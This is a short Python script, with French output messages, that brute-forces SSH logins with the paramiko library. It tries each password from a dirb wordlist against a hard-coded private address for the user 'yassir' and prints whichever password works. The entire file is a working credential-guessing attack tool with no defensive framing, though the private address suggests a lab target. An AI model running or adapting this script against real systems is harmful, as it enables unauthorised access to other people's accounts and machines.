import paramiko
import os
import sys
from tqdm import tqdm

sys.path.append('./Utiles')
from utiles import clear_line, print_red

def ssh_bruteforce(host, username):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    wordlist_path = "/usr/share/dirb/wordlists/small.txt" 
    with open(wordlist_path, 'r', errors='ignore') as f:
        passwords = f.readlines()

    total_passwords = len(passwords)

    for password in tqdm(passwords, desc="Bruteforce SSH", unit="password"):
        password = password.strip()
        try:
            ssh.connect(host, username=username, password=password)
            print(f"Mot de passe trouvé : {password}")
            ssh.close()
            return True
        except:
            pass 

    print_red("Échec de toutes les tentatives de connexion SSH.")
    return False

host = '10.0.2.15'
username = 'yassir'
ssh_bruteforce(host, username)
